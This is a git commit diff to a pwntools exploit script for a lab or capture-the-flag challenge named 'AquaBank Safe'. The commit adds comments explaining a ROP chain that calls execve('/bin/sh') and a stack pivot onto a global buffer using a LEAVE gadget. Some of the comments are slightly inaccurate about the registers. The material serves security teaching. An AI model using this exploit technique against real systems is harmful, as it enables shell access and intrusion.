2d82a91bcf07df2ea7d0e71ef6401c0c316171b8
toto001011 <salvatoreindino00@gmail.com>
2026-05-29 22:38:40 +0200

    update B:Lab03-04-recap

--- B_lab03-04_recap/AquaBank Safe/solve.py
+++ B_lab03-04_recap/AquaBank Safe/solve.py
@@ -2,7 +2,19 @@
 
 from pwn import *
 """
+Explanation:
 The idea is to exploit the stack pivoting using the global buffer VAULT
+So we "create" a fake
+
+
+Steps of the ROP chain:
+    1. Stack alignment (RET)
+    2. Set RAX = 0
+    3. Set RDI = pointer_to("/bin/sh")
+    4. Set RSI = 0
+    5. Move RAX → RDX using XCHG (since we don't have pop rdx)
+    6. Stack alignment (RET)
+    7. Call execve()
 
 """
 exe = ELF("./aquabank-safe_patched")
@@ -76,7 +88,18 @@ def main():
 
     p.sendline(b"16000")
     print(p.recvline())
+    """
+    Steps of the ROP chain:
+        1. Stack alignment (RET)
+        2. Set RAX = 0
+        3. Set RDI = pointer_to("/bin/sh")
+        4. Set RSI = 0
+        5. Move RAX → RDX using XCHG (since we don't have pop rdx)
+        6. Stack alignment (RET)
+        7. Call execve()
 
+    """
+    #execve call --> RDX=0, RDI=0,RDI="function_to_call" 
     log.info(f"VAULT ADDR:{hex( VAULT)}")
     rop_chain = flat(
         # p64(ret),
@@ -84,11 +107,11 @@ def main():
         b"A" * 8,
         # p64(0x0),
         p64(RET_LIBC),
-        p64(POP_RAX), p64(0),
+        p64(POP_RAX), p64(0),   # since POP RDX in not avaiable we can use the first part(8bit) of RAX an then exchange it with the first part (8bit) of RDX
         p64(POP_RDI),
         p64(BINSH),
         p64(POP_RSI),p64(0),
-        p64(XCHG_EDX_EAX),
+        p64(XCHG_EDX_EAX), 
         # p64(base_pie + exe.symbols["menu"]),
         # b"A" * 128,
         p64(RET_LIBC),
@@ -108,11 +131,15 @@ def main():
     #-------------stage2-------------
 
 
+
     pause()
     payload_stage2 = flat(
         b"A" * 8,
-        p64(VAULT),
-        p64(LEAVE)
+        p64(VAULT), #put the VAULT address on the stack
+        p64(LEAVE)  #The leave instruction do the following set of instruction
+                    #MOV ESP, EBP + POP RBP 
+                    #so when the rop chain will be execute the RBP addres will we overwrited with the addres of VAULT enabling the "moving" of the execution into
+                    # a new frame
     
     )
     p.sendline(payload_stage2)
